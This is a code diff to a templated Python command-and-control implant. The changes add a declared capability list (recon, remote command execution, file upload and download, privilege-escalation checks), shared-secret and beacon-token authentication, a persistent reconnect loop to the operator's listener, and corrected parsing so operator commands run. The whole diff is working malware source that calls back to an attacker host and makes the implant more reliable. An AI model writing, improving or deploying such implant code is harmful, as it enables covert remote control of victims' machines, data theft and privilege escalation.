@@ -696,6 +696,19 @@ class _NoopObf:
 _OBF = _NoopObf()
 {% endif %}
 
+# What this build can actually do, declared from the same module switches that
+# decided which handlers exist above. The listener refuses a task the implant
+# never said it could perform, so the register has to name them honestly.
+# Unconditional: the plaintext TCP ListenerClient path needs it regardless of
+# the obfuscation level.
+CAPABILITIES = [
+    {% if include_recon %}"sysinfo", "network", "processes",{% endif %}
+    {% if include_exec %}"exec",{% endif %}
+    {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
+    {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
+    "ping", "shutdown",
+]
+
 # --------------------------------------------------------------------- #
 #  Platform bootstrap
 # --------------------------------------------------------------------- #
@@ -2220,6 +2233,9 @@ class ListenerClient:
         self._sock = None
         self._fp = None
         self.session_id = ""
+        # The listener issues this at register; every later checkin and report
+        # must carry it or the listener refuses the message as not ours.
+        self.beacon_token = ""
 
     def connect(self) -> bool:
         self._sock = _sk.create_connection((self._host, self._port), timeout=self._timeout)
@@ -2245,13 +2261,22 @@ class ListenerClient:
             "arch": ARCH,
             "username": USERNAME,
             "agent_version": __version__,
+            # The listener gates tasking on what the implant declares, so the
+            # register has to name its capabilities (same list the heavy build
+            # declares in _register).
+            "capabilities": list(CAPABILITIES),
+            "max_line": 4 * 1024 * 1024,
         }
         if not _AGENT_ID:
-            # Legacy unsigned listener: single-shot register.
+            # Legacy unsigned listener: enroll with the shared secret. The
+            # listener checks this at register (agent_auth on), so an agent
+            # built without a signed identity still has to present it.
+            base["auth"] = AUTH_SECRET
             self._send(base)
             resp = self._recv()
             if resp.get("type") == "registered":
                 self.session_id = resp.get("session_id", "")
+                self.beacon_token = resp.get("beacon_token", "")
                 return True
             raise TransportError(f"register failed: {resp}")
 
@@ -2276,10 +2301,12 @@ class ListenerClient:
         if resp.get("type") != "registered":
             raise TransportError(f"registration rejected: {resp}")
         self.session_id = resp.get("session_id", "")
+        self.beacon_token = resp.get("beacon_token", "")
         return True
 
     def checkin(self) -> list:
-        self._send({"type": "checkin", "session_id": self.session_id})
+        self._send({"type": "checkin", "session_id": self.session_id,
+                    "beacon": self.beacon_token})
         resp = self._recv()
         if resp.get("type") == "commands":
             return resp.get("commands", [])
@@ -2291,6 +2318,7 @@ class ListenerClient:
             "session_id": self.session_id,
             "command_id": command_id,
             "output": output,
+            "beacon": self.beacon_token,
         })
 
     def close(self) -> None:
@@ -2308,16 +2336,30 @@ def _listener_loop() -> None:
     host = "{{ cfg.host }}"
     port = {{ cfg.port }}
     client = ListenerClient(host, port)
-    client.connect()
-    client.register()
+    # (Re)connect + register, retrying on a refused or lost link. An agent that
+    # exits the first time the listener is not up yet is worthless as a C2 — the
+    # listener routinely starts after the payload, and restarts under it.
+    def _attach() -> ListenerClient:
+        while True:
+            try:
+                c = ListenerClient(host, port)
+                c.connect()
+                c.register()
+                return c
+            except (TransportError, OSError) as e:
+                _log(f"listener unreachable ({e}); retrying", "debug")
+                _t.sleep(5)
+    client = _attach()
     _log(f"registered with listener as session {client.session_id}")
     while True:
         try:
             cmds = client.checkin()
             for c in cmds:
-                result = _dispatch({"action": c.get("command", ""), **{k: v for k, v in c.items() if k != "command"}})
-                # _dispatch returns a dict; serialize to string output.
-                out = _j.dumps(result) if not isinstance(result, str) else result
+                # Parse the operator's command line the same way the beacon
+                # loop does: _run_command splits "fs_list /path" into the action
+                # and its args before dispatch. Sending the raw string as the
+                # action makes every parameterised command an "unknown action".
+                out = _run_command(c.get("command", ""))
                 client.report(c.get("command_id", ""), out)
                 _scrub(_scrub_str(out))
                 out = ""
@@ -2328,9 +2370,7 @@ def _listener_loop() -> None:
                 client.close()
             except Exception:
                 pass
-            client = ListenerClient(host, port)
-            client.connect()
-            client.register()
+            client = _attach()
         _jittered_sleep({{ cfg.sleep }}, {{ cfg.jitter }})
 
 # --------------------------------------------------------------------- #
